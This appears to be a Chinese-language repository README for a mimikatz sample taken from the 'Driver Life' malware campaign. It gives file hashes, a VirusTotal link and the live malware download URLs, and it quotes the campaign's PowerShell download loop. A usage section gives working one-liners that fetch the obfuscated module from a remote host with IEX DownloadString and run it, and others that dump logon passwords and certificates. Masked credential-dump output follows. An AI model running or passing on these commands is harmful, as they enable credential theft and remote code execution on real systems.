### "驱动人生"-mimikatz样本

```
7fe00c654df98f23409bf4416b6394d6e8af6a83c4a31ea42e0c4e82e866735d  PEBytes32.dll
ef525c47de9cceacafe796b28c09d4780a2cc49abc3f2199ae2e83bc7b4b78fa  PEBytes64.dll
fa1331aba1f68ca18f3ad8a8f6c87526e6d69ed4734312f997215660f2d50aac  README.md
e70132be487ca63d5b5d52cfa25273958526dc896c62eaf8bea041339fa8aece  mimi.dat
```

#### REFERENCE: 

https://raw.githubusercontent.com/vysecurity/ps1-toolkit/master/Invoke-Mimikatz.ps1



#### virustotal 样本地址：

First Submission： 2021-03-31 11:10:21

SHA-256：e70132be487ca63d5b5d52cfa25273958526dc896c62eaf8bea041339fa8aece

https://www.virustotal.com/gui/file/e70132be487ca63d5b5d52cfa25273958526dc896c62eaf8bea041339fa8aece/community



远程下载地址：

```cmd
http://bb3u9.com/mimi.dat?v=&r=1
http://bb3u9.com/mimi.dat?v=&r=2
http://bb3u9.com/mimi.dat?v=&r=3
```



```powershell
if-1.4.ps1:15841:$mimipath = $env:tmp+'\mimi.dat'
if-1.4.ps1:15851:    try{(new-object System.Net.WebClient).DownloadFile($down_url+"/mimi.dat?v=$VVERSION&r=$d_retry",$mimipath)}catch{}

————————————————————————————————————————————————————————————————————————————————————————————————————

$mimipath = $env:tmp+'\mimi.dat'

$d_retry=3 

while(!(Test-Path $mimipath) -or (Get-Item $mimipath).length -ne 3563487){
    if($d_retry -eq 0){break}
    write-host "try to get mimi...$d_retry"
    try{(new-object System.Net.WebClient).DownloadFile($down_url+"/mimi.dat?v=$VVERSION&r=$d_retry",$mimipath)}catch{}
    $d_retry--
    start-sleep 1

}
```



### 使用方法：

```powershell
#目标主机具备网络环境
powershell "IEX (New-Object Net.WebClient).DownloadString('https://www.xxx.com/mimi.dat'); Invoke-Udyeijdyqid -kkudhqydyq2"

#目标主机不具备网络环境
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.1/mimi.dat');Invoke-Udyeijdyqid -kkudhqydyq2"

#把文件下载到目标主机进行执行
powershell Import-Module .\mimi.dat;Invoke-Udyeijdyqid -Command '"privilege::debug" "sekurlsa::logonPasswords exit"'

#其他使用方法
powershell -NonInteractive Import-Module .\mimi.dat;Invoke-Udyeijdyqid -kkudhqydyq2
powershell -NonInteractive Import-Module .\mimi.dat;Invoke-Udyeijdyqid -DumpCerts
powershell -NonInteractive Import-Module .\mimi.dat;Invoke-Udyeijdyqid -Command '"privilege::debug" "sekurlsa::logonPasswords exit"'
```

默认使用的是：mimikatz 2.2.0

```cmd
PS C:\temp> .\mimi.ps1;Invoke-Udyeijdyqid
S-1-5-21-2070056706-1071056509-2494751531-1000
Hostname: xxx-PC / S-1-5-21-2070056706-1071056509-2494751531

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 27 2020 13:42:38
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 629014 (00000000:00099916)
Session           : Interactive from 1
User Name         : xxx
Domain            : xxx-PC
Logon Server      : xxx-PC
Logon Time        : 2021/11/1 10:49:09
SID               : S-1-5-21-2070056706-1071056509-2494751531-1000
        msv :
         [00000003] Primary
         * Username : xxx
         * Domain   : xxx-PC
         * NTLM     : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
         * SHA1     : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
         [00010000] CredentialKeys
         * NTLM     : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
         * SHA1     : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
        tspkg :
        wdigest :
         * Username : xxx
         * Domain   : xxx-PC
         * Password : xxxxxxxxx
```

